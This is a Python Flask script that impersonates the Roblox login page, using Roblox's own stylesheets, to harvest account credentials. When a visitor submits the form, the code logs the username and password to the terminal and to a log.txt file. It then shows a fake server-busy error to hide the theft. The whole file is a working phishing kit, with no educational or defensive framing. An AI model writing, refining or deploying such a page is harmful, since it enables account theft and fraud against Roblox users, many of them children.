import os
import datetime
from flask import Flask, request, render_template_string

app = Flask(__name__)

# File path for the log
current_dir = os.path.dirname(os.path.abspath(__file__))
LOG_FILE_PATH = os.path.join(current_dir, "log.txt")

# We use your exact CSS links and wrap the form in Roblox-standard classes
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Log in to Roblox</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <link rel="stylesheet" href="https://css.rbxcdn.com/bc6c479bd8ed8c94c8c16d5431728ac35cc8a90272c190a4048742055bb1e88d-FoundationCss.css">
    <link rel="stylesheet" href="https://css.rbxcdn.com/cfd5a413ec221b8b28b5fb9ba4204c0b77b5548e78a608e3da01c928e7117a24-ReactStyleGuide.css">
    <link rel="stylesheet" href="https://css.rbxcdn.com/91916339a0d1695e194977e5770a69e5793455887fc79df2e847290247c6e504-StyleGuide.css">
    <link rel="stylesheet" href="https://css.rbxcdn.com/5902e84671fbff3987b7f4ab81d38e488d06c38bdffebf3aa4a77745d56f948e-ReactLogin.css">
    
    <style>
        /* Ensuring the background matches Roblox Dark Mode */
        body { background-color: #191B1D !important; color: #FFFFFF; }
        .login-container { padding-top: 50px; max-width: 400px; margin: 0 auto; }
        .rbx-header { margin-bottom: 25px; text-align: center; font-size: 24px; font-weight: 700; }
    </style>
</head>
<body class="rbx-body dark-theme">
    <div class="container-main">
        <div class="login-container">
            <div class="section-content">
                <h1 class="rbx-header">Login to Roblox</h1>
                
                <form method="POST">
                    <div class="form-group">
                        <input name="u" type="text" class="form-control input-field" placeholder="Username/Email/Phone" required>
                    </div>
                    <div class="form-group">
                        <input name="p" type="password" class="form-control input-field" placeholder="Password" required>
                    </div>
                    
                    <button type="submit" class="btn-primary-md login-button" style="width:100%; margin-top:10px;">Log In</button>
                </form>

                <div class="text-footer" style="margin-top: 20px; text-align: center;">
                    <a href="#" class="font-bold">Forgot Password or Username?</a>
                </div>
                
                <div class="rbx-divider" style="margin: 20px 0; border-top: 1px solid #393B3D;"></div>
                
                <button type="button" class="btn-control-md" style="width:100%; margin-bottom:10px;">Quick Sign-in</button>
                
                <div class="text-footer" style="text-align: center; margin-top: 15px;">
                    Don't have an account? <a href="#" class="font-bold" style="color: #00A2FF;">Sign Up</a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('u')
        password = request.form.get('p')
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = f"[{timestamp}] USER: {username} | PASS: {password}"
        
        # Immediate terminal log
        print(f"\nCaptured: {username} / {password}", flush=True)
        
        # Save to log.txt
        try:
            with open(LOG_FILE_PATH, "a") as f:
                f.write(log_entry + "\n")
        except Exception as e:
            print(f"File Save Error: {e}", flush=True)
            
        return "<h1>HTTP 500</h1><p>The server is busy. Please refresh the page.</p>"
    
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    # Ask the user for a port and provide a default if they just hit Enter
    user_port = input("Enter port number (default 5000): ")
    
    # Use 5000 if the input is empty, otherwise convert input to integer
    port = int(user_port) if user_port.strip() else 5000
    
    print(f" * Starting app on port {port}")
    app.run(host='0.0.0.0', port=port)

